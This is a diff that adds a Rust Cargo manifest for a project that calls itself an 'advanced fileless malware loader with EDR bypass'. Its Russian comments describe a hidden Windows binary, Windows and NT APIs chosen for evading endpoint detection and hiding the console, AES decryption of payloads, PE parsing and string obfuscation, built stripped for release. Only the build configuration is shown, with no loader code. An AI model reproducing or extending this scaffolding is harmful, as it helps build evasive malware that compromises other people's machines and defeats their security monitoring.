@@ -1,0 +1,67 @@
+[package]
+name = "runtime_loader_rust"
+version = "0.1.0"
+edition = "2021"
+build = "build.rs"
+description = "Advanced fileless malware loader with EDR bypass"
+authors = ["Advanced Research Team"]
+
+# ДОБАВЛЕНО: Library target для тестов модулей
+[lib]
+name = "runtime_loader_rust"
+path = "src/lib.rs"
+
+# КРИТИЧНО: Настройка для скрытого Windows приложения
+[[bin]]
+name = "runtime_loader_rust"
+path = "src/main.rs"
+
+[dependencies]
+# Основные Windows API
+windows = { version = "0.48", features = [
+    "Win32_System_LibraryLoader",
+    "Win32_System_Memory",
+    "Win32_Foundation",
+    "Win32_System_Threading"
+]}
+
+# Системные вызовы и низкоуровневые API
+ntapi = "0.4"
+
+# Windows API для EDR bypass и скрытия
+winapi = { version = "0.3", features = [
+    "libloaderapi",
+    "memoryapi",
+    "winnt",
+    "ntdef",
+    "processthreadsapi",
+    "wincon",       # Для скрытия консоли
+    "winuser",      # Для ShowWindow, SW_HIDE
+    "consoleapi",   # Для консольных операций
+    "sysinfoapi"    # Для GetVersionExA и OSVERSIONINFOA
+]}
+
+# Криптография для AES дешифровки
+aes = "0.7"
+block-modes = "0.8"
+
+# PE анализ и работа с файлами
+pelite = "0.10"
+memmap2 = "0.5"
+obfstr = "0.4.4"
+sha2 = "0.10.9"
+
+[profile.release]
+opt-level = 3           # Максимальная оптимизация
+lto = true             # Link Time Optimization
+codegen-units = 1      # Единая единица компиляции
+panic = "abort"        # Уменьшает размер бинарника
+strip = true           # Удаляет отладочную информацию
+
+[profile.dev]
+opt-level = 0
+debug = true
+
+# Метаданные для Windows платформы
+[package.metadata.docs.rs]
+targets = ["x86_64-pc-windows-msvc"]
